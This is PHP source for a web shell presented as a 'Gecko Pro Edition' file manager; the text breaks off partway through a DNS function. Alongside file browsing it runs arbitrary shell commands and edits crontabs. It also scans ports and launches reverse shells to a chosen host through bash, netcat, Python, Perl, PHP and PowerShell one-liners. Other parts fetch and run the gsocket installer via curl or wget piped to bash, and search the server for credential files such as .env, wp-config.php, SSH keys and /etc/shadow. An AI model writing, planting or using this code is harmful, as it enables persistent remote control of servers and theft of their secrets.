<?php
/**
 * Gecko Pro Edition - File Manager
 * Compatible with PHP 5.4 - PHP 8.x
 */

// ───── Polyfills (kompatibilitas lintas versi PHP) ────────────────
if (!function_exists('http_response_code')) {
    // PHP < 5.4 fallback
    function http_response_code($code = null) {
        static $current = 200;
        if ($code !== null) {
            header(' ', true, (int)$code);
            $current = (int)$code;
        }
        return $current;
    }
}

if (!function_exists('str_contains')) {
    // PHP < 8.0 polyfill
    function str_contains($haystack, $needle) {
        return $needle === '' || strpos($haystack, $needle) !== false;
    }
}

if (!defined('JSON_UNESCAPED_UNICODE')) define('JSON_UNESCAPED_UNICODE', 0);
if (!defined('JSON_UNESCAPED_SLASHES')) define('JSON_UNESCAPED_SLASHES', 0);

// ───── Konfigurasi awal ───────────────────────────────────────────
$realBase = realpath(__DIR__);
$baseDir  = $realBase ? $realBase : __DIR__;

// Set upload limits
@ini_set('upload_max_filesize', '100M');
@ini_set('post_max_size', '100M');
@ini_set('max_file_uploads', '20');
@ini_set('memory_limit', '256M');
@ini_set('display_errors', 0); // Matikan display errors agar tidak merusak JSON
error_reporting(E_ALL);

function jsonOut($data, $code = 200)
{
    http_response_code((int)$code);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}


function sanitizeRelPath($path)
{
    $path = (string)$path;
    // Decode URL encoded path first
    $path = urldecode($path);

    // Handle Windows paths (C:/, D:/, etc)
    if (preg_match('/^[A-Za-z]:/', $path)) {
        // Normalize slashes
        $path = str_replace('\\', '/', $path);
        // Fix double slashes
        $path = preg_replace('#/+#', '/', $path);
        // Ensure format like C:/path/to/folder
        $path = preg_replace('/^([A-Za-z]:)\/*/', '$1/', $path);
        return $path;
    }

    // Handle absolute Linux paths
    if (strlen($path) > 0 && $path[0] === '/') {
        $path = preg_replace('#/+#', '/', $path);
        return $path;
    }

    // Original relative path logic
    $path = str_replace(array('\\', "\0"), array('/', ''), $path);
    $path = trim($path, '/');
    $parts = array_filter(explode('/', $path), function($p) {
        return $p !== '' && $p !== '.';
    });
    $clean = array();
    foreach ($parts as $part) {
        if ($part === '..') { array_pop($clean); continue; }
        if (preg_match('/[\x00-\x1f]/', $part)) continue;
        $clean[] = $part;
    }
    return implode('/', $clean);
}

function resolvePath($baseDir, $relPath, $mustExist = true)
{
    $rel = sanitizeRelPath($relPath);

    // Handle absolute Windows paths (C:/, D:/, etc)
    if (preg_match('/^[A-Za-z]:\//', $rel)) {
        // Convert to system path
        $full = str_replace('/', DIRECTORY_SEPARATOR, $rel);

        if ($mustExist) {
            $real = realpath($full);
            if ($real !== false) {
                return $real;
            }
            return null;
        } else {
            // Check if parent exists
            $parent = dirname($full);
            if (is_dir($parent) || is_dir($full)) {
                return $full;
            }
            return null;
        }
    }

    // Handle absolute Linux paths
    if (strlen($rel) > 0 && $rel[0] === '/') {
        if ($mustExist) {
            $real = realpath($rel);
            if ($real !== false) {
                return $real;
            }
            return null;
        } else {
            $parent = dirname($rel);
            if (is_dir($parent) || is_dir($rel)) {
                return $rel;
            }
            return null;
        }
    }

    // Handle relative paths
    $full = $rel === '' ? $baseDir : $baseDir . DIRECTORY_SEPARATOR . str_replace('/', DIRECTORY_SEPARATOR, $rel);
    $real = $mustExist ? realpath($full) : (is_file($full) || is_dir($full) ? realpath($full) : null);

    if ($real === false || $real === null) {
        if (!$mustExist) {
            $parent = dirname($full);
            $parentReal = realpath($parent);
            $baseDirNormalized = str_replace('\\', '/', $baseDir);
            $parentRealNormalized = $parentReal ? str_replace('\\', '/', $parentReal) : '';
            if ($parentReal && strpos($parentRealNormalized, $baseDirNormalized) === 0) {
                return $full;
            }
        }
        return null;
    }

    $realNormalized = str_replace('\\', '/', $real);
    $baseDirNormalized = str_replace('\\', '/', $baseDir);
    $starts = strpos($realNormalized, $baseDirNormalized) === 0;
    return $starts ? $real : null;
}

function formatBytes($bytes)
{
    $bytes = (int)$bytes;
    if ($bytes < 1024) return $bytes . ' B';
    $units = array('KB', 'MB', 'GB', 'TB');
    $v = $bytes / 1024;
    foreach ($units as $u) {
        if ($v < 1024) return number_format($v, $v >= 100 ? 0 : 1) . ' ' . $u;
        $v /= 1024;
    }
    return number_format($v, 1) . ' PB';
}

function fileIcon($name, $dir)
{
    if ($dir) return 'folder';
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));

    $iconMap = array(
        'php' => 'php', 'phtml' => 'php',
        'js' => 'js', 'mjs' => 'js', 'ts' => 'js', 'tsx' => 'js', 'jsx' => 'js',
        'css' => 'css', 'scss' => 'css', 'sass' => 'css', 'less' => 'css',
        'html' => 'html', 'htm' => 'html',
        'json' => 'config', 'yaml' => 'config', 'yml' => 'config',
        'xml' => 'config', 'toml' => 'config', 'env' => 'config', 'ini' => 'config',
        'md' => 'text', 'txt' => 'text', 'log' => 'text',
        'png' => 'image', 'jpg' => 'image', 'jpeg' => 'image',
        'gif' => 'image', 'webp' => 'image', 'svg' => 'image', 'ico' => 'image',
        'zip' => 'archive', 'rar' => 'archive', '7z' => 'archive',
        'tar' => 'archive', 'gz' => 'archive',
        'sql' => 'database', 'db' => 'database',
    );

    return isset($iconMap[$ext]) ? $iconMap[$ext] : 'file';
}

function isTextFile($path)
{
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $text = array('php','phtml','js','mjs','ts','tsx','jsx','css','scss','sass','less','html','htm',
        'json','yaml','yml','xml','toml','env','ini','md','txt','log','sql','htaccess','gitignore','csv');
    if (in_array($ext, $text, true)) return true;
    $size = filesize($path);
    if ($size === false || $size > 512000) return false;
    $fh = fopen($path, 'rb');
    if (!$fh) return false;
    $chunk = fread($fh, 8192); fclose($fh);
    return $chunk !== false && !preg_match('/[\x00-\x08\x0e-\x1f]/', $chunk);
}

function listEntries($dir)
{
    $items = array();
    $h = @opendir($dir);
    if (!$h) return $items;
    while (($name = readdir($h)) !== false) {
        if ($name === '.' || $name === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $name;
        $isDir = is_dir($full);
        $perm = substr(sprintf('%o', fileperms($full)), -4);
        $sz = @filesize($full);
        $mt = @filemtime($full);
        $items[] = array(
            'name' => $name,
            'is_dir' => $isDir,
            'size' => $isDir ? null : (int)($sz ? $sz : 0),
            'modified' => (int)($mt ? $mt : time()),
            'icon' => fileIcon($name, $isDir),
            'perm' => $perm,
            'editable' => !$isDir && isTextFile($full),
        );
    }
    closedir($h);
    usort($items, function ($a, $b) {
        if ($a['is_dir'] !== $b['is_dir']) return $a['is_dir'] ? -1 : 1;
        return strcasecmp($a['name'], $b['name']);
    });
    return $items;
}

function runTerminal($command, $cwd)
{
    if (!function_exists('proc_open')) {
        return array('output' => 'proc_open() is disabled on this server.', 'exit_code' => 1);
    }
    $descriptors = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $cmd = $isWin ? 'cmd /C ' . $command : $command;
    $pipes = array();
    $proc = @proc_open($cmd, $descriptors, $pipes, $cwd);
    if (!is_resource($proc)) return array('output' => 'Failed to execute.', 'exit_code' => 1);
    fclose($pipes[0]);
    $stdout = stream_get_contents($pipes[1]); fclose($pipes[1]);
    $stderr = stream_get_contents($pipes[2]); fclose($pipes[2]);
    $code = proc_close($proc);
    $stdout = $stdout ? $stdout : '';
    $stderr = $stderr ? $stderr : '';
    $sep = ($stdout !== '' && $stderr !== '') ? "\n" : '';
    $out = trim($stdout . $sep . $stderr);
    if ($out === '') {
        $out = ($code === 0) ? '(no output)' : '';
    }
    return array('output' => $out, 'exit_code' => $code);
}

function searchFiles($baseDir, $relDir, $query, &$results, &$count, $limit = 200)
{
    if ($count >= $limit) return;
    $dir = resolvePath($baseDir, $relDir);
    if (!$dir || !is_dir($dir)) return;
    $h = @opendir($dir);
    if (!$h) return;
    while (($name = readdir($h)) !== false) {
        if ($name === '.' || $name === '..') continue;
        if ($count >= $limit) break;
        $full = $dir . DIRECTORY_SEPARATOR . $name;
        $itemRel = $relDir === '' ? $name : $relDir . '/' . $name;
        if (stripos($name, $query) !== false) {
            $isDir = is_dir($full);
            $sz = @filesize($full);
            $results[] = array(
                'path' => $itemRel,
                'name' => $name,
                'is_dir' => $isDir,
                'icon' => fileIcon($name, $isDir),
                'size' => $isDir ? null : (int)($sz ? $sz : 0),
            );
            $count++;
        }
        if (is_dir($full)) searchFiles($baseDir, $itemRel, $query, $results, $count, $limit);
    }
    closedir($h);
}

function getCrontab()
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        $result = runTerminal('schtasks /query /fo LIST', $GLOBALS['baseDir']);
        return array('content' => $result['output'], 'platform' => 'windows', 'editable' => false);
    }
    $result = runTerminal('crontab -l 2>&1', $GLOBALS['baseDir']);
    $out = $result['output'];
    if (stripos($out, 'no crontab') !== false) {
        $out = '';
    }
    return array('content' => $out, 'platform' => 'unix', 'editable' => true);
}

function setCrontab($content)
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        return array('ok' => false, 'error' => 'Edit crontab on Windows via schtasks in Terminal.');
    }
    $tmp = tempnam(sys_get_temp_dir(), 'cron');
    if ($tmp === false) {
        return array('ok' => false, 'error' => 'Cannot create temp file');
    }
    file_put_contents($tmp, rtrim((string)$content) . "\n");
    $result = runTerminal('crontab ' . escapeshellarg($tmp), $GLOBALS['baseDir']);
    @unlink($tmp);
    if ($result['exit_code'] !== 0) {
        return array('ok' => false, 'error' => $result['output'] ? $result['output'] : 'Failed to save crontab');
    }
    return array('ok' => true);
}

function parsePortList($spec, $max = 500)
{
    $ports = array();
    foreach (explode(',', (string)$spec) as $part) {
        $part = trim($part);
        if ($part === '') continue;
        if (preg_match('/^(\d+)\s*-\s*(\d+)$/', $part, $m)) {
            $start = max(1, min(65535, (int)$m[1]));
            $end = max(1, min(65535, (int)$m[2]));
            if ($start > $end) { $t = $start; $start = $end; $end = $t; }
            for ($p = $start; $p <= $end && count($ports) < $max; $p++) {
                $ports[$p] = $p;
            }
        } elseif (preg_match('/^\d+$/', $part)) {
            $p = (int)$part;
            if ($p >= 1 && $p <= 65535 && count($ports) < $max) {
                $ports[$p] = $p;
            }
        }
    }
    return array_values($ports);
}

function scanPorts($host, $portsSpec, $timeout = 1)
{
    $host = trim((string)$host);
    if ($host === '' || !preg_match('/^[a-zA-Z0-9.\-_]+$/', $host)) {
        return array('ok' => false, 'error' => 'Invalid host');
    }
    $timeout = max(1, min(5, (int)$timeout));
    $ports = parsePortList($portsSpec, 500);
    if (empty($ports)) {
        return array('ok' => false, 'error' => 'No valid ports (e.g. 22,80,443 or 1-1024)');
    }
    $open = array();
    $ip = @gethostbyname($host);
    foreach ($ports as $port) {
        $conn = @fsockopen($host, $port, $errno, $errstr, $timeout);
        if ($conn) {
            $open[] = (int)$port;
            fclose($conn);
        }
    }
    sort($open);
    return array('ok' => true, 'host' => $host, 'ip' => $ip, 'open' => $open, 'scanned' => count($ports));
}

function startBackconnect($ip, $port, $method)
{
    $ip = trim((string)$ip);
    $port = (int)$port;
    $method = strtolower(trim((string)$method));
    if ($ip === '' || !preg_match('/^[a-zA-Z0-9.\-_]+$/', $ip)) {
        return array('ok' => false, 'error' => 'Invalid IP/hostname');
    }
    if ($port < 1 || $port > 65535) {
        return array('ok' => false, 'error' => 'Invalid port');
    }
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $payloads = array(
        'bash'   => "bash -c 'bash -i >& /dev/tcp/{$ip}/{$port} 0>&1'",
        'nc'     => "rm -f /tmp/.bc;mkfifo /tmp/.bc;cat /tmp/.bc|/bin/sh -i 2>&1|nc {$ip} {$port} >/tmp/.bc",
        'python' => "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{$ip}\",{$port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        'perl'   => "perl -e 'use Socket;\$i=\"{$ip}\";\$p={$port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        'php'    => "php -r '\$s=fsockopen(\"{$ip}\",{$port});proc_open(\"/bin/sh -i\",array(0=>\$s,1=>\$s,2=>\$s),\$p);'",
    );
    if ($isWin) {
        $payloads['powershell'] = "powershell -nop -W hidden -c \"\$c=New-Object Net.Sockets.TCPClient('{$ip}',{$port});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$r2=\$r+'PS '+(pwd).Path+'> ';\$sb=([Text.Encoding]::ASCII).GetBytes(\$r2);\$s.Write(\$sb,0,\$sb.Length)}\"";
        $payloads['nc'] = "nc.exe {$ip} {$port} -e cmd.exe";
    }
    if (!isset($payloads[$method])) {
        return array('ok' => false, 'error' => 'Unknown method');
    }
    $cmd = $payloads[$method];
    if ($isWin) {
        @pclose(@popen('start /B ' . $cmd, 'r'));
    } else {
        @exec($cmd . ' > /dev/null 2>&1 &');
    }
    return array('ok' => true, 'message' => 'Backconnect started (' . $method . ') → ' . $ip . ':' . $port);
}

function gsocketIsFirewalled($output)
{
    $out = strtolower((string)$output);
    return strpos($out, 'cannot connect to gsrn') !== false
        || (strpos($out, 'firewalled') !== false && strpos($out, 'gsrn') !== false);
}

function gsocketBuildCommand($method, $port = null)
{
    $method = strtolower(trim((string)$method));
    if ($method === 'wget') {
        $inner = 'wget --no-check-certificate -qO- https://gsocket.io/y';
    } else {
        $method = 'curl';
        $inner = 'curl -fsSLk https://gsocket.io/y';
    }
    $prefix = 'GS_NOCERTCHECK=1';
    if ($port !== null) {
        $prefix .= ' GS_PORT=' . (int)$port;
    }
    return array(
        'command' => $prefix . ' bash -c "$(' . $inner . ')"',
        'method' => $method,
        'port' => $port,
    );
}

function runGsocket($method)
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        return array('ok' => false, 'error' => 'GSocket installer requires bash (Linux/Unix).');
    }
    if (!function_exists('proc_open')) {
        return array('ok' => false, 'error' => 'proc_open() is disabled on this server.');
    }
    @set_time_limit(1800);
    @ini_set('max_execution_time', '1800');

    $portsToTry = array(null);
    for ($p = 22; $p <= 67; $p++) {
        $portsToTry[] = $p;
    }

    $allOutput = '';
    $attempts = 0;
    $successPort = null;
    $lastCommand = '';
    $lastMethod = strtolower(trim((string)$method));
    if ($lastMethod !== 'wget') {
        $lastMethod = 'curl';
    }
    $lastExit = 1;
    $stoppedOnFirewalled = false;

    foreach ($portsToTry as $port) {
        $built = gsocketBuildCommand($method, $port);
        $command = $built['command'];
        $lastCommand = $command;
        $lastMethod = $built['method'];
        $label = ($port === null) ? 'default (no GS_PORT)' : ('GS_PORT=' . $port);
        $attempts++;

        $result = runTerminal($command, $GLOBALS['baseDir']);
        if ($result['output'] === 'Failed to execute.') {
            return array('ok' => false, 'error' => 'Failed to execute GSocket installer.', 'command' => $command);
        }

        $lastExit = (int)$result['exit_code'];
        $firewalled = gsocketIsFirewalled($result['output']);
        $allOutput .= '=== Attempt ' . $attempts . ': ' . $label . " ===\n";
        $allOutput .= '$ ' . $command . "\n\n";
        $allOutput .= $result['output'] . "\n";
        $allOutput .= '(exit ' . $lastExit . ")\n\n";

        if (!$firewalled) {
            $successPort = $port;
            $allOutput .= '=== SUCCESS: GSRN reachable with ' . $label . " ===\n";
            break;
        }

        $stoppedOnFirewalled = true;
        if ($port !== null && $port >= 67) {
            $allOutput .= "=== FAILED: All ports tried (default + GS_PORT=22..67) — still firewalled ===\n";
        }
    }

    $portLabel = ($successPort === null) ? 'default' : (string)$successPort;

    return array(
        'ok' => true,
        'output' => $allOutput,
        'exit_code' => $lastExit,
        'command' => $lastCommand,
        'method' => $lastMethod,
        'gs_port' => $successPort,
        'gs_port_label' => $portLabel,
        'attempts' => $attempts,
        'firewalled' => ($successPort === null && $stoppedOnFirewalled),
        'success' => ($successPort !== null || !$stoppedOnFirewalled),
    );
}

function runSecTool($tool, $input, $baseDir)
{
    $tool = strtolower(trim((string)$tool));
    switch ($tool) {
        case 'recon':
            return secRecon($baseDir);
        case 'sensitive':
            return secSensitiveScan($baseDir, (string)_v($input, 'path', ''));
        case 'processes':
            return secProcesses($baseDir);
        case 'network':
            return secNetwork($baseDir);
        case 'http':
            return secHttpRequest(
                (string)_v($input, 'url', ''),
                (string)_v($input, 'method', 'GET'),
                (string)_v($input, 'headers', ''),
                (string)_v($input, 'body', '')
            );
        case 'hash':
            return secHash((string)_v($input, 'text', ''), (string)_v($input, 'algo', 'sha256'));
        case 'codec':
            return secCodec((string)_v($input, 'mode', 'b64enc'), (string)_v($input, 'text', ''));
        case 'dns':
            return secDns((string)_v($input, 'host', ''), (string)_v($input, 'type', 'ALL'));
        case 'suid':
            return secSuidFind($baseDir);
        default:
            return array('ok' => false, 'error' => 'Unknown security tool');
    }
}

function secRecon($baseDir)
{
    $lines = array();
    $lines[] = '=== SYSTEM RECON ===';
    $lines[] = 'Timestamp : ' . date('Y-m-d H:i:s T');
    $lines[] = 'PHP       : ' . PHP_VERSION . ' (' . PHP_SAPI . ')';
    $lines[] = 'OS        : ' . PHP_OS;
    $lines[] = 'Server    : ' . (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '-');
    $lines[] = 'Hostname  : ' . (function_exists('gethostname') ? gethostname() : '-');
    $lines[] = 'Doc Root  : ' . (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '-');
    $lines[] = 'Script    : ' . __FILE__;
    $lines[] = 'Base Dir  : ' . $baseDir;
    $lines[] = 'Client IP : ' . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '-');
    $lines[] = '';

    $lines[] = '=== USER / PRIVILEGE ===';
    $lines[] = 'PHP user  : ' . get_current_user();
    if (function_exists('posix_geteuid')) {
        $lines[] = 'UID/EUID  : ' . posix_getuid() . ' / ' . posix_geteuid();
        $pw = @posix_getpwuid(posix_geteuid());
        if ($pw) $lines[] = 'Account   : ' . $pw['name'] . ' (home: ' . (isset($pw['dir']) ? $pw['dir'] : '-') . ')';
        $groups = @posix_getgroups();
        if ($groups) {
            $gn = array();
            foreach ($groups as $gid) {
                $g = @posix_getgrgid($gid);
                $gn[] = $g ? $g['name'] : $gid;
            }
            $lines[] = 'Groups    : ' . implode(', ', $gn);
        }
    }
    $whoami = runTerminal('whoami 2>&1', $baseDir);
    $lines[] = 'whoami    : ' . trim($whoami['output']);
    $id = runTerminal('id 2>&1', $baseDir);
    $lines[] = 'id        : ' . trim($id['output']);
    $lines[] = '';

    $lines[] = '=== PHP SECURITY ===';
    $lines[] = 'disable_functions : ' . (ini_get('disable_functions') ? ini_get('disable_functions') : '(none)');
    $lines[] = 'open_basedir      : ' . (ini_get('open_basedir') ? ini_get('open_basedir') : '(none)');
    $lines[] = 'allow_url_fopen   : ' . (ini_get('allow_url_fopen') ? 'On' : 'Off');
    $lines[] = 'allow_url_include : ' . (ini_get('allow_url_include') ? 'On' : 'Off');
    $lines[] = 'display_errors    : ' . (ini_get('display_errors') ? 'On' : 'Off');
    $lines[] = 'expose_php        : ' . (ini_get('expose_php') ? 'On' : 'Off');
    $lines[] = 'proc_open         : ' . (function_exists('proc_open') && !secFuncDisabled('proc_open') ? 'Available' : 'Disabled');
    $lines[] = 'shell_exec        : ' . (function_exists('shell_exec') && !secFuncDisabled('shell_exec') ? 'Available' : 'Disabled');
    $lines[] = 'curl              : ' . (function_exists('curl_init') ? 'Available' : 'Missing');
    $lines[] = 'PDO               : ' . (class_exists('PDO') ? 'Available' : 'Missing');
    $lines[] = '';

    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if (!$isWin) {
        $lines[] = '=== KERNEL / SYSTEM ===';
        $uname = runTerminal('uname -a 2>&1', $baseDir);
        $lines[] = trim($uname['output']);
        $lines[] = 'Uptime: ' . trim(runTerminal('uptime 2>&1', $baseDir)['output']);
        $lines[] = '';
    }

    $lines[] = '=== ENVIRONMENT (selected) ===';
    $envKeys = array('PATH', 'HOME', 'USER', 'LOGNAME', 'SHELL', 'PWD', 'TEMP', 'TMP', 'HTTP_HOST', 'SERVER_NAME');
    foreach ($envKeys as $k) {
        $v = getenv($k);
        if ($v !== false && $v !== '') $lines[] = $k . '=' . $v;
    }

    return array('ok' => true, 'output' => implode("\n", $lines));
}

function secFuncDisabled($fn)
{
    $disabled = ini_get('disable_functions');
    if (!$disabled) return false;
    return in_array($fn, array_map('trim', explode(',', $disabled)), true);
}

function secSensitiveScan($baseDir, $scanPath)
{
    $patterns = array(
        '.env', '.env.local', '.env.production', '.env.backup', '.env.old',
        'wp-config.php', 'configuration.php', 'config.php', 'settings.php', 'LocalSettings.php',
        'database.yml', 'secrets.yml', 'web.config', 'appsettings.json', 'local.settings.json',
        'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'authorized_keys', '.htpasswd',
        'docker-compose.yml', 'docker-compose.yaml', '.git/config', 'passwd', 'shadow',
        'backup.sql', 'dump.sql', 'db.sql', '.my.cnf', 'pgpass', '.pgpass',
    );
    $roots = array();
    if ($scanPath !== '') {
        $resolved = resolvePath($baseDir, $scanPath, false);
        if ($resolved && @is_dir($resolved)) $roots[] = $resolved;
    }
    if (empty($roots)) {
        $roots[] = $baseDir;
        foreach (array('/var/www', '/home', '/etc', '/tmp', dirname($baseDir)) as $r) {
            if (@is_dir($r) && !in_array($r, $roots, true)) $roots[] = $r;
        }
    }

    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $found = array();
    if (!$isWin) {
        $nameExpr = array();
        foreach ($patterns as $p) {
            $nameExpr[] = '-name ' . escapeshellarg($p);
        }
        $expr = '\( ' . implode(' -o ', $nameExpr) . ' \)';
        foreach ($roots as $root) {
            $cmd = 'find ' . escapeshellarg($root) . ' -maxdepth 7 ' . $expr . ' -type f 2>/dev/null | head -60';
            $out = runTerminal($cmd, $baseDir);
            foreach (explode("\n", $out['output']) as $line) {
                $line = trim($line);
                if ($line !== '' && @is_file($line)) {
                    $found[$line] = array(
                        'path' => $line,
                        'size' => @filesize($line),
                        'perm' => substr(sprintf('%o', @fileperms($line)), -4),
                        'readable' => @is_readable($line),
                    );
                }
            }
            if (count($found) >= 80) break;
        }
    } else {
        secWalkSensitive($roots[0], $patterns, $found, 0, 6);
    }

    $lines = array('=== SENSITIVE FILE SCAN ===', 'Roots: ' . implode(', ', $roots), 'Found: ' . count($found), '');
    foreach ($found as $item) {
        $flag = $item['readable'] ? '[R]' : '[--]';
        $lines[] = $flag . ' ' . $item['perm'] . ' ' . secFormatBytes(isset($item['size']) ? $item['size'] : 0) . '  ' . $item['path'];
    }
    if (empty($found)) $lines[] = '(no sensitive files found in scan scope)';

    return array('ok' => true, 'output' => implode("\n", $lines), 'count' => count($found), 'files' => array_values($found));
}

function secWalkSensitive($dir, $patterns, &$found, $depth, $maxDepth)
{
    if ($depth > $maxDepth || count($found) >= 80) return;
    $h = @opendir($dir);
    if (!$h) return;
    while (($name = readdir($h)) !== false) {
        if ($name === '.' || $name === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $name;
        if (in_array($name, $patterns, true) && @is_file($full)) {
            $found[$full] = array(
                'path' => $full,
                'size' => @filesize($full),
                'perm' => substr(sprintf('%o', @fileperms($full)), -4),
                'readable' => @is_readable($full),
            );
        }
        if (@is_dir($full) && $depth < $maxDepth) {
            secWalkSensitive($full, $patterns, $found, $depth + 1, $maxDepth);
        }
        if (count($found) >= 80) break;
    }
    closedir($h);
}

function secFormatBytes($bytes)
{
    $bytes = (int)$bytes;
    if ($bytes < 1024) return $bytes . 'B';
    if ($bytes < 1048576) return round($bytes / 1024, 1) . 'K';
    return round($bytes / 1048576, 1) . 'M';
}

function secProcesses($baseDir)
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $cmd = $isWin ? 'tasklist /V' : 'ps auxww 2>/dev/null || ps -ef 2>/dev/null';
    $result = runTerminal($cmd, $baseDir);
    return array('ok' => true, 'output' => $result['output']);
}

function secNetwork($baseDir)
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        $cmd = 'netstat -ano';
    } else {
        $cmd = 'ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null || netstat -an 2>/dev/null';
    }
    $result = runTerminal($cmd, $baseDir);
    $extra = runTerminal($isWin ? 'ipconfig /all' : 'ip addr 2>/dev/null; echo "---"; ip route 2>/dev/null', $baseDir);
    $out = "=== LISTENING / CONNECTIONS ===\n" . $result['output'] . "\n\n=== INTERFACES / ROUTES ===\n" . $extra['output'];
    return array('ok' => true, 'output' => $out);
}

function secHttpRequest($url, $method, $headersRaw, $body)
{
    $url = trim($url);
    if ($url === '' || !preg_match('#^https?://#i', $url)) {
        return array('ok' => false, 'error' => 'URL must start with http:// or https://');
    }
    $method = strtoupper(trim($method));
    if (!in_array($method, array('GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'), true)) {
        return array('ok' => false, 'error' => 'Invalid HTTP method');
    }

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        if ($body !== '' && in_array($method, array('POST', 'PUT', 'PATCH'), true)) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        }
        $hdrs = array();
        foreach (preg_split('/\r?\n/', $headersRaw) as $line) {
            $line = trim($line);
            if ($line !== '') $hdrs[] = $line;
        }
        if (!empty($hdrs)) curl_setopt($ch, CURLOPT_HTTPHEADER, $hdrs);
        $resp = curl_exec($ch);
        $err = curl_error($ch);
        $info = curl_getinfo($ch);
        curl_close($ch);
        if ($resp === false) return array('ok' => false, 'error' => $err ? $err : 'Request failed');
        $out = "=== HTTP RESPONSE ===\n";
        $out .= 'URL    : ' . $url . "\n";
        $out .= 'Method : ' . $method . "\n";
        $out .= 'Code   : ' . (isset($info['http_code']) ? $info['http_code'] : '?') . "\n";
        $out .= 'Time   : ' . (isset($info['total_time']) ? round($info['total_time'], 3) . 's' : '?') . "\n\n";
        $out .= $resp;
        return array('ok' => true, 'output' => $out);
    }

    $cmd = 'curl -sS -k -i -X ' . escapeshellarg($method);
    foreach (preg_split('/\r?\n/', $headersRaw) as $line) {
        $line = trim($line);
        if ($line !== '') $cmd .= ' -H ' . escapeshellarg($line);
    }
    if ($body !== '' && in_array($method, array('POST', 'PUT', 'PATCH'), true)) {
        $cmd .= ' --data ' . escapeshellarg($body);
    }
    $cmd .= ' ' . escapeshellarg($url);
    $result = runTerminal($cmd, $GLOBALS['baseDir']);
    return array('ok' => true, 'output' => $result['output']);
}

function secHash($text, $algo)
{
    $algos = array('md5', 'sha1', 'sha256', 'sha512', 'crc32');
    $algo = strtolower(trim($algo));
    if (!in_array($algo, $algos, true)) {
        return array('ok' => false, 'error' => 'Invalid algorithm');
    }
    if ($algo === 'crc32') {
        $hash = sprintf('%u', crc32($text));
    } else {
        $hash = hash($algo, $text);
    }
    $out = "=== HASH ($algo) ===\nInput length: " . strlen($text) . " bytes\n\n" . $hash;
    return array('ok' => true, 'output' => $out, 'hash' => $hash, 'algo' => $algo);
}

function secCodec($mode, $text)
{
    $mode = strtolower(trim($mode));
    $result = '';
    switch ($mode) {
        case 'b64enc':
            $result = base64_encode($text);
            break;
        case 'b64dec':
            $decoded = base64_decode($text, true);
            if ($decoded === false) return array('ok' => false, 'error' => 'Invalid Base64');
            $result = $decoded;
            break;
        case 'urlenc':
            $result = rawurlencode($text);
            break;
        case 'urldec':
            $result = rawurldecode($text);
            break;
        case 'rot13':
            $result = str_rot13($text);
            break;
        case 'hexenc':
            $result = bin2hex($text);
            break;
        case 'hexdec':
            if (!preg_match('/^[0-9a-fA-F\s]+$/', $text)) {
                return array('ok' => false, 'error' => 'Invalid hex string');
            }
            $clean = preg_replace('/\s+/', '', $text);
            if (strlen($clean) % 2 !== 0) return array('ok' => false, 'error' => 'Odd-length hex');
            $result = pack('H*', $clean);
            break;
        default:
            return array('ok' => false, 'error' => 'Unknown codec mode');
    }
    $out = "=== CODEC ($mode) ===\n\n" . $result;
    return array('ok' => true, 'output' => $out, 'result' => $result);
}

function secDns($host, $type)
{
    $host = trim($host);
    if ($host === '' || !preg_match('/^[a-zA-Z0-9.\-_]+$/', $host)) {
        return array('ok' => false, 'error' => 'Invalid hostname');
    }
    if (!function_exists('dns_get_record')) {
        return array('ok' => false, 'error' => 'dns_get_record() not available');
    }
    $type = strtoupper(trim($type));
    $map = array(
        'A' => DNS_A, 'AAAA' => DNS_AAAA, 'MX' => DNS_MX, 'TXT' => DNS_TXT,
        'NS' => DNS_NS, 'CNAME' => DNS_CNAME, 'SOA' => DNS_SOA, 'PTR' => DNS_PTR,
    );
